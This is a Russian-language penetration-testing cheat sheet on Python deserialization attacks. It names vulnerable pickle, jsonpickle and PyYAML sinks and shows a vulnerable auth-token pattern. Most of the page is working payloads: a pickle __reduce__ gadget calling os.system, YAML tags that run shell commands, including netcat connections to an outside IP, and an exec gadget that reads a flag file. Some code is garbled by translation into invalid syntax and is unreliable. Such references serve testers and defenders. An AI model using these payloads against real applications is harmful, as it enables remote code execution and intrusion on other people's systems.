* [Десериализация Python](#Десериализация-Python)
* [Инструменты](#Инструменты)
* [Методология](#Методология)
  * [Pickle](#Pickle)
  * [PyYAML](#PyYAML)
* [URL](#URL)

# Десериализация Python

> Десериализация Python — это процесс восстановления объектов Python из сериализованных данных, обычно выполняемый с использованием таких форматов, как JSON, pickle или YAML.
>> Модуль pickle — часто используемый инструмент в Python для этой цели, поскольку он может сериализовать и десериализовать сложные объекты Python, включая пользовательские классы.

# Инструменты

j0lt-github/python-deserialization-attack-payload-generator — Сериализованная полезная нагрузка для RCE-атаки на десериализацию на приложения Python, где для десериализации сериализованных данных используются модули pickle, PyYAML, ruamel.yaml или jsonpickle.

# Методология

**В исходном коде Python найдите следующие приёмники:**

* cPickle.loads
* pickle.loads
* _pickle.loads
* jsonpickle.decode

### Pickle

Следующий код — это простой пример использования cPickle для генерации auth_token, представляющего собой сериализованный объект User. :warning: import cPickle будет работать только на Python 2
```
import cPickle
from base64 import b64encode, b64decode

class User:
def __init__(self):
self.username = "anonymous"
self.password = "anonymous"
self.rank = "guest"

h = User()
auth_token = b64encode(cPickle.dumps(h))
print("Ваш токен авторизации: {}").format(auth_token)
```

Уязвимость возникает при загрузке токена из пользовательского ввода.

```
new_token = raw_input("Новый токен авторизации: ")
token = cPickle.loads(b64decode(new_token))
print "Welcome {}".format(token.username)
```
> Модуль pickle не защищён от ошибочных или вредоносных данных.

```
import cPickle, os
from base64 import b64encode, b64decode

class Evil(object):
def __reduce__(self):
return (os.system,("whoami",))

e = Evil()
evil_token = b64encode(cPickle.dumps(e))
print("Ваш токен Evil : {}").format(evil_token)
```

### PyYAML

> Десериализация YAML — это процесс преобразования данных в формате YAML обратно в объекты в таких языках программирования, как Python, Ruby или Java. YAML популярен для файлов конфигурации и сериализации данных, поскольку он удобен для чтения человеком и поддерживает сложные структуры данных.
```
!!python/object/apply:time.sleep [10]
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["ls","-ail"]]
```
```
!!python/object/apply:subprocess.Popen
- ls
```
```
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
state:
update: !!python/name:exec
```
Начиная с версии PyYaml 6.0, загрузчик по умолчанию для ```load``` был переключен на SafeLoader, что снижает риски удалённого выполнения кода. PR #420 - [Исправление](https://github.com/yaml/pyyaml/issues/420)

Уязвимыми приёмниками теперь являются ```yaml.unsafe_load``` и ```yaml.load(input, Loader=yaml.UnsafeLoader)```.
```
с open('exploit_unsafeloader.yml') в качестве файла:
data = yaml.load(file,Loader=yaml.UnsafeLoader)
```


# URL

* [yaml](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)
* [yaml](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization)
* [MgicMethods](https://coderpad.io/blog/development/guide-to-python-magic-methods/)
